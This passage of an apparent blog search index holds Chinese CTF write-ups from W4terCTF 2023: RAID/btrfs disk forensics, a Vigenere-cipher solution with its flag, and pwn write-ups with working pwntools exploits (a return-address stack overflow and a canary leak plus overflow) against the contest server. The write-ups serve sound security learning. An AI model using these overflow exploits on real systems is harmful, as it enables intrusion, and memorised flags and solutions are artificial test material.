/dev/loop7 KESNic6iRwY3.img //不过我们这里采用的是直接挂载， //因为后面会出现需要读写权限的操作，如果采用只读就要回来再走一遍了（心累） sudo losetup /dev/loop0 UkAQZEahRpFP.img sudo losetup /dev/loop1 G6i0ErEQwiFm.img sudo losetup /dev/loop2 NKGGtuKv6Qr4.img sudo losetup /dev/loop3 O53ORjQLbNjg.img sudo losetup /dev/loop4 q8snWXN5Ltwx.img sudo losetup /dev/loop5 Y1et5EJL2XGX.img sudo losetup /dev/loop6 BpStXfb7DgbO.img sudo losetup /dev/loop7 KESNic6iRwY3.img //使用mdadm来组装 sudo apt install mdadm sudo mdadm --build --assume-clean --chunk=128 --level=0 --raid-devices=8 /dev/md0 /dev/loop{0,1,2,3,4,5,6,7} //如果loop是连续的可以简写为： sudo mdadm --build --assume-clean --chunk=128 --level=0 --raid-devices=8 /dev/md0 /dev/loop{0..7} 输出：mdadm: array /dev/md0 built and started. //挂载我们的/dev/md0 mkdir mountpoint sudo mount -o ro /dev/md0p1 mountpoint/ cd mountpoint //激动人心的时刻到了！！！ //ls 查看有什么文件 cat 读文件 ls cat note.txt 输出如下图： 好了，人已经有点懵了，我们之前看到的flag.7z在哪里？难道是什么奇怪的隐写取证吗？？ 在接下来的一长段时间里，我拿010editor仔细查看了一下8个文件的数据，也没有任何头绪，最后实在没思路了和GZ学长联系了一下，题目补充了一个重要的hint：磁盘上的文件系统类型是 btrfs 后来才发现原来ubuntu也已经告诉我了，不过当时不了解btrfs文件系统，也没有往这方面多想 名字下面就告诉我们是btrfs文件系统了/悲/ 三 挂载隐藏卷，取得flag # 方法一：直接在Ubuntu或kali等虚拟机构建btrfs文件系统 # 接下来就是一连串的构建btrfs文件操作系统和重新开始挂载磁盘之路了： （赶时间的同学可以忽略，因为后面有更加简单的方法）\nsudo apt install btrfs-progs //装就完了 sudo df -ha //看看文件系统磁盘使用情况 fallocate -l 512M /tmp/btrfs.img mkfs.btrfs /tmp/btrfs.img sudo mkdir /mnt/btrfs sudo mount /tmp/btrfs.img /mnt/btrfs sudo chmod 777 /mnt/btrfs sudo mkdir my_btrfs sudo mount /tmp/btrfs.img my_btrfs sudo mount /dev/md0p1 my_btrfs /mnt/sysimage df my_btrfs //判断是否是btrfs文件系统 cd my_btrfs sudo mkdir mountpoint //需要读写权限 btrfs filesystem df mountpoint sudo mount -o ro /dev/md0p1 mountpoint ls cat note* 输出的结果还是一样的， 这个时候我们就要好好想想还有哪里可以藏flag文件了。 重点在btrfs文件系统的特殊之处：Btrfs文件系统有subvolume与snapshot功能，及可以创建子卷与快照。 查看子卷的命令：\nsudo apt install btrfs-progs //在mountpoint目录查看子卷 btrfs subvol list ./ btrfs subvol list 这个命令非常关键，他能让我们发现原来在这个磁盘下有着隐藏着的子卷，看到他们的名字我们就知道了： @data 与 @secret，flag 应该就在 @secret里面了。 搭载子卷的命令：\n//将挂载卷的ID改为@secret的ID sudo btrfs subvolume set-default 258 /mnt/sysimage/mountpoint //重新挂载 cd .. sudo umount mo* sudo mount /dev/md0p1 mo* cd mo* //将挂载卷的ID改为@data的ID cd .. sudo umount mo* sudo mount /dev/md0p1 mo* cd mo* ls 不过，在这一整个过程，非常容易出现以下这行字(也有可能是英文版的)：\nmount: /mnt/mountpoint: 文件系统类型错误、选项错误、/dev/md0p1 上有坏超级块、缺少代码页或帮助程序或其他错误. dmesg(1) may have more information after failed mount system call. 可能是因为我们在建立btrfs文件系统时有一些小错误，或是多次挂载导致硬盘文件有了损坏。 这里可以选择执行命令来查看问题并修复，不过有点复杂。\nsudo dmesg 所以，我在多次尝试失败后采用了另一种方法——直接下载带有btrfs文件系统的linux系统，与ubuntu齐名的Fedora： https://getfedora.org/zh_Hans_CN/ 后面的整个操作就一路绿灯啦！\n方法二：安装Fedora，直接挂载隐藏卷 # 第二、第三部分全部命令（Fedora虚拟机下） # //第一步：连接共享文件夹，将8个磁盘文件组装起来： vmware-hgfsclient sudo mkdir -p /mnt/hgfs sudo /usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs_fuse,allow_other cd /mnt/hgfs cd share ls sudo losetup -f //输出：/dev/loop3 sudo losetup /dev/loop3 UkAQZEahRpFP.img sudo losetup /dev/loop4 G6i0ErEQwiFm.img sudo losetup /dev/loop5 NKGGtuKv6Qr4.img sudo losetup /dev/loop6 O53ORjQLbNjg.img sudo losetup /dev/loop7 q8snWXN5Ltwx.img sudo losetup /dev/loop8 Y1et5EJL2XGX.img sudo losetup /dev/loop9 BpStXfb7DgbO.img sudo losetup /dev/loop10 KESNic6iRwY3.img sudo mdadm --build --assume-clean --chunk=128 --level=0 --raid-devices=8 /mnt/md0 /dev/loop{3,4,5,6,7,8,9,10} //输出：mdadm: array /dev/md0 built and started. //------------------------------------------------------// //第二步：在btrfs文件系统下挂载磁盘 sudo blkid //查看btrfs文件系统的目录 //部分输出：/dev/nvme0n1p3: LABEL=\u0026#34;fedora_localhost-live\u0026#34; UUID=\u0026#34;ddb495f5-ddf3-4dfc-bd6f-9ea32304a4ab\u0026#34; UUID_SUB=\u0026#34;c7d187e8-96d6-4301-a1a0-0ee1b5adb011\u0026#34; BLOCK_SIZE=\u0026#34;4096\u0026#34; TYPE=\u0026#34;btrfs\u0026#34; PARTUUID=\u0026#34;a5b72680-20da-4446-9e5b-e35eacb881dc\u0026#34; sudo df -ha //查看/dev/nvme0n1p3挂载的目录 //部分输出：/dev/nvme0n1p3 19G 2.9G 16G 16% /mnt/sysimage cd /mnt/sysimage sudo mkdir mountpoint sudo mount /dev/md0p1 mo* cd mo* ls -a //-a 查看是否有隐藏文件 //输出：. .. note.txt cat note* /*输出：Wow, you found me! But it doesn\u0026#39;t look like there\u0026#39;s anything here...*/ //----------------------------------------------------// //第三步：挂载隐藏卷，执行脚本获得密码，解开压缩包得flag sudo btrfs subvolume list ./ /* 输出： ID 256 gen 12 top level 5 path @ ID 257 gen 10 top level 5 path @data ID 258 gen 10 top level 5 path @secret */ sudo btrfs subvolume set-default 258 /mnt/sysimage/mountpoint //将挂载卷的ID改为@secret的ID cd .. sudo umount mo* sudo mount /dev/md0p1 mo* cd mo* //输出：flag.7z cp flag.7z /mnt/hgfs/share //复制到我们的真机里 //打开提示需要密码，输入后面代码执行得到的密码就可以得到flag啦 sudo btrfs subvolume set-default 257 /mnt/sysimage/mountpoint //将挂载卷的ID改为@data的ID cd .. sudo umount mo* sudo mount /dev/md0p1 mo* cd mo* ls //输出： //calc.py data cp calc.py /mnt/hgfs/share //复制到我们的真机里,方便解读代码，也可以试着跑一跑，发现要在原文件夹执行，然后就会输出flag.7z的密码 python3 calc.py //输出：Well done! The password for flag.7z is [/*一串超级长的数字*/] 做题时的截图：（不得不说Fedora还是挺好看的） calc.py的代码：\n# Use this script to calculate the hash of the ./data folder # The result can be used to excrypt the flag.7z file import hashlib import os def hashfile(hasher_func, path, blocksize = 65536): afile = open(path, \u0026#39;rb\u0026#39;) hasher = hasher_func() buf = afile.read(blocksize) while len(buf) \u0026gt; 0: hasher.update(buf) buf = afile.read(blocksize) afile.close() return hasher.hexdigest().encode() def hashdir(hasher_func, path, blocksize = 65536): hasher = hasher_func() for root, dirs, files in os.walk(path): for name in files: print(os.path.join(root, name)) hasher.update(os.path.join(root, name).encode()) hasher.update(hashfile(hasher_func, os.path.join(root, name), blocksize)) for _dir in dirs: hasher.update(hashdir(hasher_func, os.path.join(root, _dir), blocksize)) return hasher.hexdigest().encode() if __name__ == \u0026#39;__main__\u0026#39;: pre_hash = hashdir(hashlib.md5, \u0026#39;./data\u0026#39;) if pre_hash != b\u0026#39;da206f2407171ed2ea0779a1e93af014\u0026#39;: print(\u0026#39;Something is wrong, please check your volume!\u0026#39;) exit(1) hash_pwd = hashdir(hashlib.sha256, \u0026#39;./data\u0026#39;) print(f\u0026#34;Well done! The password for flag.7z is [{hash_pwd.decode()}]\u0026#34;) the end # 完成这道题前前后后大概跨越了三天，第一步判断磁盘顺序全靠有师傅们的题解，引领我从零开始学习RAID相关知识，第二步与第三步着实让我认认真真地熟悉了一遍linux系统的各种操作，还学习了一下btrfs的相关知识（其实在第三步的方法一中为了解决报错都把btrfs的官方文件看了好几遍了 😇 ）\n一道题完整地解决再认真地写一下wp，实实在在地学到了许多东西。在次，也让我对我在ctf路上最好的朋友——搜索引擎 表达一下我深深的感谢！ 还有一个小彩蛋，我在做题时参考了一下GZ学长的wp： https://blog.gztime.cc/posts/2021/b76fbea6/#%E9%98%B5%E5%88%97%E6%81%A2%E5%A4%8D%E5%A4%A7%E5%B8%88 以后一定~~（翻一翻)~~好好读一读学长的blog。\n最后： 感谢您的阅读！这是我在ctf路上写的第一份完整wp，有任何不足之处还请批评指正！ 离开前再复习一下这一篇wp的主要内容吧 ! see you next time ! ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/11_w4ter-disk_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003e此文章仅限战队内部成员阅读\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e路过的师傅们看看远处的wp吧：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn 初赛 · ta0lve\u003c/a\u003e\u003c/p\u003e","title":"misc-W4ter Disk"},{"content":"此文章仅限战队内部成员阅读\n路过的师傅们看看远处的wp吧：\n2023 ciscn 初赛 · ta0lve\n文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\r先在浏览器上访问实例，可以得到密文：\nOkze WEYng,\nD eixy jgty lrmdtpt afhlm onf cdyf lgm icxn gik\u0026rsquo;qp kmwijbwv oey mrsheklrhe ho ROC wpubkptfrm. Ll hdp hhwq, sqjvsbactywt fm i whtnozy wzfydibhb iv lltx PNQ vqpgiyvaur, ltc vn\u0026rsquo;d bvejonihj sz nziy l zxdy rhlyhregmqcyz xu oey lcvepxdan pglgtmnqid spigacbnnh oeub uhd fydq.\nCy vupnpck whxazntlliqn, oey Dcwdykqr uyw Lpzpuz wyoskqf ucx ydkrfil sgzobrm. Ean Kddyvyhd noouyc bb p klfgubosgarntv bjwpnqnkstum pcaang oeub oidd g qrjptcxid emsmncj sb yyvrecbl xfqhyzdkn xxbhvdya. Cj\u0026rsquo;r l vnjycyda zkwzsfstum gize, kjo fn kud ap iqnwvxm jnfho zhdbadawj twpgvmqm. Jgp Izrmlk lxkeyz ci z dolcfpk bjwpnqnkstum pcaang oeub mxhqzr runa utoqyz cd ssk oyutgctsq vg u vhikc aoxung jc jwmystumf xzpw icb utjxzmks. Zioxac xosxnefcgous zyotmp gwlu zobzawpw ncxosxnyny zdpbybzjzp mcwx zd zgr Uoojcxbx Mhsqjvsviy Lcpiauzx (QDD). GDF cd t bnhjyblyb ptbesamrdi xfoihhenl gblm dhzp u syo sz kmpljic pia xmwhxaz cnnl. Bc\u0026rsquo;h ybmqaddo zn eydbbi vqniwar qxnz ygxw icb gwmj zobzawpw ldhmobyhr ltc vm hbmtgv oayt sz kmpljic hzkmqnyup jzgu. Llhbhbnzcs dyiqljebxc dp uvijgpx hzjzkcpiq yvwhxazhbh exlwifkcy jglz\u0026rsquo;r hmpw rc XQZ kbqkwkmtyd. Tbnhjyblyb ptbesamrdi rmmm jvz qdlm, l idqgfw syo zyj z cltojiz hyg, ne dyiqlje tws ybwzsfs ogsn. Ce\u0026rsquo;l ldhjivfo tdkc vh obpxoxf acwmlzteyd tws nbwclu bzslhhtvjidlh xleszinym.\nTg ldizfcmyny, iqljehpgvmbg ci z qgrpcytcxid uvx sglrkrhrbwv nrvryss enzg\u0026rsquo;m nkridzut ne BEL buuwencbbm. Ebusskq lif\u0026rsquo;kn czt nw WJE zx za yiingdbhkyt BELde, oywngnquvxymr zgr xtyotmbhb ydbceogczg ctxehqkkdd or rmdxwidxf bi itnidrx tg cwzpy kbqkwkmtyd. Dntk brxfeqttf nho ajkz cov whznqhaa eaxhz zcxbuqd!\nEnhl qejv dp Q4byhBEL ncyy uapxb ovLQU31 ftcrlwbwt Oe3 ovxuqwomr mPvaT7 pkxmlbhyk 8TECpW dcybltcdd 1Y amqycercz 1oyyO3DbJ ikbmp uapxb.\nVmmj qpmzexd, Wa. 0e\n可以看出来密文应该是用维吉尼亚密码来加密的，我们可以自己写脚本来解密，也可以直接用在线网站解密， python脚本参考： https://cloud.tencent.com/developer/article/1076719 在线网站： https://www.guballa.de/vigenere-solver 解码之后得到原文：\nDear CTFer,\nI hope this message finds you well and that you're enjoying the excitement of CTF challenges. As you know, cryptography is a crucial component of many CTF challenges, and it's important to have a good understanding of the different encryption techniques that are used. In classic cryptography, the Vigenere and Caesar ciphers are popular choices. The Vigenere cipher is a polyalphabetic substitution cipher that uses a repeating keyword to encipher plaintext messages. It's a powerful encryption tool, but it can be cracked using frequency analysis. The Caesar cipher is a simpler substitution cipher that shifts each letter in the plaintext by a fixed number of positions down the alphabet. Modern cryptography offers more advanced encryption techniques such as the Advanced Encryption Standard (AES). AES is a symmetric encryption algorithm that uses a key to encrypt and decrypt data. It's designed to resist attacks from even the most advanced computers and is widely used to encrypt sensitive data. Asymmetric encryption is another important encryption technique that's used in CTF challenges. Asymmetric encryption uses two keys, a public key and a private key, to encrypt and decrypt data. It's commonly used in digital signatures and secure communication protocols. In conclusion, cryptography is a fascinating and challenging subject that's critical to CTF challenges. Whether you're new to CTF or an experienced CTFer, understanding the different encryption techniques is essential to succeed in these challenges. Keep exploring and have fun cracking those ciphers! Your flag is W4terCTF open brace unRAV31 underline Th3 underline sEcrE7 underline 8URIeD underline 1N underline 1reqU3NcY close brace. Best regards, Dr. 0p\nflag即为：\n最后一段： W4terCTF open brace unRAV31 underline Th3 underline sEcrE7 underline 8URIeD underline 1N underline 1reqU3NcY close brace\n翻译一下： W4terCTF开大括号unRAV31下划线Th3下划线sEcrE7下划线8URIeD下划线1N下划线1reqU3NcY结束大括号。\n得到： W4terCTF{unRAV31_Th3_sEcrE7_8URIeD_1N_1reqU3NcY}\n网站更新： https://www.boxentriq.com/code-breaking/cipher-identifier https://www.boxentriq.com/code-breaking/vigenere-cipher https://ctf.bugku.com/tools 可以先用第一个网站查看最有可能利用的加密方法，再用第二个网站爆破密钥，第二、三个网站可以用来解密全文\n","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/7_weird-letter_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003e此文章仅限战队内部成员阅读\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e路过的师傅们看看远处的wp吧：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn 初赛 · ta0lve\u003c/a\u003e\u003c/p\u003e","title":"misc-Weird Letter"},{"content":"","date":"July 5, 2023","permalink":"/series/my-first-series-of-ctf-wp/","section":"Series","summary":"","title":"My first series of CTF wp"},{"content":"此文章仅限战队内部成员阅读\n路过的师傅们看看远处的wp吧：\n2023 ciscn 初赛 June 30, 2023\u0026middot;1691 字\u0026middot;4 分钟 WP CTF PWN reverse Crypto 文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\r栈溢出利用的基本步骤 # 1.将程序拖入IDA中查看反汇编代码 # （也可以自己先利用题目给出的C语言源码搞清楚程序逻辑后再IDA分析） 可以看到当我们的游戏win时会让我们输入名字，且s字符串的大小只有16， 2.用鼠标点击变量s，可以查看vulnerable函数的栈， # 可以看到 s 的大小为0x14 - 0x4 = 0x10 = 16 s 离返回地址的距离为0x14 - 0x0 = 20 由32位栈调用的原理可知在跳到返回地址前函数栈还会pop ebp寄存器， 所以我们的填充数据段大小为20+4=24，\n3.最后找到我们要跳转到后门函数（或者是可以get shell）的地址 # 可以看到在地址为 0x08049236 的汇编代码是success函数的开始，所以我们的跳转的返回地址可以为 0x08049236 这里的返回地址还可以写0x08049242之前的其他地址： 0x08049237、0x08049239、0x0804923A、0x0804923D 但是0x08049242及之后的地址就不行了，因为转到这些地址时函数的get shell 指令就不能完整地执行 发送地址时我们用p32()来进行32位的小端打包字节并发送\nexp如下： # from pwn import* context(arch = \u0026#34;amd64\u0026#34;, os= \u0026#39;linux\u0026#39;) context.log_level = \u0026#39;debug\u0026#39; taolve = remote(\u0026#39;ctf.w4terdr0p.team\u0026#39;, 26539) #taolve = process(\u0026#39;./0\u0026#39;) \u0026#39;\u0026#39;\u0026#39; 填充字符 \u0026#39;\u0026#39;\u0026#39; offset = 24 #填充字符的长度 ret_adrr=0x08049236 payload = b\u0026#39;a\u0026#39;*offset + p32(ret_adrr) #我们要修改为的返回地址 taolve.recvuntil(b\u0026#39;Please give me a position(0-8):\u0026#39;) taolve.sendline(b\u0026#39;1\u0026#39;) taolve.recvuntil(b\u0026#39;Please give me a position(0-8):\u0026#39;) taolve.sendline(b\u0026#39;1\u0026#39;) #填一个不合理的数字让电脑帮我们下棋（） #实际执行时发现我们随便填一个数字其实最后都是有可能win的，一次没win就两次（） taolve.recvuntil(b\u0026#39;Please give me a position(0-8):\u0026#39;) taolve.sendline(b\u0026#39;1\u0026#39;) taolve.recvuntil(b\u0026#39;Tell me your name:\\n\u0026#39;) taolve.sendline(payload) taolve.interactive() #最后转到交互模式后还需要使用linux命令行来得到flag #ls 指令来查看当前目录下有哪些文件和文件夹 #cat flag 来打印 flag \u0026#39;\u0026#39;\u0026#39; 如果出现下面这句话： [*] Got EOF while reading in interactive 则说明可能之前的栈溢出填充字符的长度计算错误， 或者是我们所填写的返回地址有错误， 比如未完成之前的必要汇编指令就强行执行一些指令 \u0026#39;\u0026#39;\u0026#39; 补充：pwn基础——如何定位溢出点位置 # ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/2_tic-tac-toe-level-0_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003e此文章仅限战队内部成员阅读\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e路过的师傅们看看远处的wp吧：\u003c/p\u003e\n\n\u003csection class=\"space-y-10 w-full\"\u003e\n    \n    \n        \n            \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \u003ca class=\"flex flex-wrap article border border-neutral-200 dark:border-neutral-700 border-2 rounded-md backdrop-blur\" href=\"/posts/wp/2023_06_ciscn/\"\u003e\n    \n        \n        \u003cdiv class=\"w-full md:w-auto h-full thumbnail nozoom \" style=\"background-image:url(/posts/wp/2023_06_ciscn/featured.jpg);\"\u003e\u003c/div\u003e\n        \n      \u003cdiv class=\" p-4\"\u003e\n      \u003cdiv class=\"items-center text-xl font-semibold\"\u003e\n        \n        \u003cdiv class=\"font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral\"\n          href=\"/posts/wp/2023_06_ciscn/\"\u003e2023 ciscn 初赛\u003c/div\u003e\n        \n        \n        \n      \u003c/div\u003e\n      \u003cdiv class=\"text-sm text-neutral-500 dark:text-neutral-400\"\u003e\n        \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u003cdiv class=\"flex flex-row flex-wrap items-center\"\u003e\n  \n  \n  \u003ctime datetime=\"2023-06-30 00:00:00 \u0026#43;0000 UTC\"\u003eJune 30, 2023\u003c/time\u003e\u003cspan class=\"px-2 text-primary-500\"\u003e\u0026middot;\u003c/span\u003e\u003cspan\u003e1691 字\u003c/span\u003e\u003cspan class=\"px-2 text-primary-500\"\u003e\u0026middot;\u003c/span\u003e\u003cspan title=\"预计阅读\"\u003e4 分钟\u003c/span\u003e\n  \n\n  \n  \n\u003c/div\u003e\n\n\n\n\n\n\u003cdiv class=\"flex flex-row flex-wrap items-center\"\u003e\n  \n  \n  \n  \n  \n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/categories/wp/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    WP\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/tags/ctf/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    CTF\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/tags/pwn/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    PWN\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/tags/reverse/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    reverse\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/tags/crypto/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    Crypto\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \n  \n  \n\u003c/div\u003e\n\n\n\n      \u003c/div\u003e\n      \n    \u003c/div\u003e\n  \u003c/a\u003e\n        \n    \n\u003c/section\u003e\n\u003chr\u003e","title":"PWN-Level 0 Tic-Tac-Toe "},{"content":"此文章仅限战队内部成员阅读\n路过的师傅们看看远处的wp吧：\n2023 ciscn 初赛 · ta0lve\n文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\r由canary的结构我们可以得知当我们输入的填充字符覆盖掉canary的最后一位/00字符时就能利用输出函数将canary的值打印出来，知道canary的值后我们就能绕过Canary保护进行栈溢出啦 exp:\n# encoding: utf-8 from pwn import* #context(arch = \u0026#34;amd64\u0026#34;, os= \u0026#39;linux\u0026#39;) context.log_level = \u0026#39;debug\u0026#39; taolve = remote(\u0026#39;ctf.w4terdr0p.team\u0026#39;, 39302) #taolve = process(\u0026#39;./1\u0026#39;) \u0026#39;\u0026#39;\u0026#39; 填充字符 \u0026#39;\u0026#39;\u0026#39; offset = 40 ret_adrr = 0x4013DB taolve.recvuntil(b\u0026#39;How many tokens would you like to take?: \u0026#39;) taolve.send(b\u0026#39;a\u0026#39;*40+b\u0026#39;d\u0026#39;) taolve.recvuntil(b\u0026#39;ad\u0026#39;) canary = u64(b\u0026#39;\\x00\u0026#39; + taolve.recv(7)) print(hex(canary)) payload = b\u0026#39;a\u0026#39;*40 + p64(canary) + p64(0) + p64(ret_adrr) taolve.recvuntil(b\u0026#39;How many tokens would you like to take?: \u0026#39;) taolve.send(payload) taolve.interactive() ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/3_nimgame-level-1_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003e此文章仅限战队内部成员阅读\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e路过的师傅们看看远处的wp吧：\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn 初赛 · ta0lve\u003c/a\u003e\u003c/p\u003e","title":"PWN-Level 1 Nimgame"},{"content":"此文章仅限战队内部成员阅读\n路过的师傅们看看远处的wp吧：\n2023 ciscn 初赛 June 30, 2023\u0026middot;1691 字\u0026middot;4 分钟 WP CTF PWN reverse Crypto 文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE ---\r1.给出的实例入口为 host:port，则可以使用 nc host port 来连接到对应的实例 需要在linux虚拟机 / macos 中安装nc ，在Windows上也可以安装nc （不过要设置好环境变量，可能系统还会报毒） 2.用python的pwntools库来远程连接实例入口\nfrom pwn import* context.log_level = \u0026#39;debug\u0026#39; taolve = remote(\u0026#34;ctf.w4terdr0p.team\u0026#34;, 45423) taolve.interactive() ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/1_what-is-netcat_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003e此文章仅限战队内部成员阅读\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e路过的师傅们看看远处的wp吧：\u003c/p\u003e\n\u003chr\u003e\n\n\u003csection class=\"space-y-10 w-full\"\u003e\n    \n    \n        \n            \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \u003ca class=\"flex flex-wrap article border border-neutral-200 dark:border-neutral-700 border-2 rounded-md backdrop-blur\" href=\"/posts/wp/2023_06_ciscn/\"\u003e\n    \n        \n        \u003cdiv class=\"w-full md:w-auto h-full thumbnail nozoom \" style=\"background-image:url(/posts/wp/2023_06_ciscn/featured.jpg);\"\u003e\u003c/div\u003e\n        \n      \u003cdiv class=\" p-4\"\u003e\n      \u003cdiv class=\"items-center text-xl font-semibold\"\u003e\n        \n        \u003cdiv class=\"font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral\"\n          href=\"/posts/wp/2023_06_ciscn/\"\u003e2023 ciscn 初赛\u003c/div\u003e\n        \n        \n        \n      \u003c/div\u003e\n      \u003cdiv class=\"text-sm text-neutral-500 dark:text-neutral-400\"\u003e\n        \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u003cdiv class=\"flex flex-row flex-wrap items-center\"\u003e\n  \n  \n  \u003ctime datetime=\"2023-06-30 00:00:00 \u0026#43;0000 UTC\"\u003eJune 30, 2023\u003c/time\u003e\u003cspan class=\"px-2 text-primary-500\"\u003e\u0026middot;\u003c/span\u003e\u003cspan\u003e1691 字\u003c/span\u003e\u003cspan class=\"px-2 text-primary-500\"\u003e\u0026middot;\u003c/span\u003e\u003cspan title=\"预计阅读\"\u003e4 分钟\u003c/span\u003e\n  \n\n  \n  \n\u003c/div\u003e\n\n\n\n\n\n\u003cdiv class=\"flex flex-row flex-wrap items-center\"\u003e\n  \n  \n  \n  \n  \n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/categories/wp/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    WP\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \n  \n  \n  \n  \n  \n  \n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/tags/ctf/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    CTF\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/tags/pwn/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    PWN\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/tags/reverse/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    reverse\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \u003cspan style=\"margin-top:0.5rem\" class=\"mr-2\" onclick=\"window.open(\u0026#34;/tags/crypto/\u0026#34;,'_self');\"\u003e\n    \u003cspan class=\"flex\"\u003e\n  \u003cspan\n    class=\"rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400\"\n  \u003e\n    Crypto\n  \u003c/span\u003e\n\u003c/span\u003e\n\n  \u003c/span\u003e\n  \n  \n  \n  \n\u003c/div\u003e\n\n\n\n      \u003c/div\u003e\n      \n    \u003c/div\u003e\n  \u003c/a\u003e\n        \n    \n\u003c/section\u003e","title":"PWN-What is NetCat"},{"content":"","date":"July 5, 2023","permalink":"/tags/pwntool/","section":"Tags","summary":"","title":"pwntool"},{"content":"","date":"July 5, 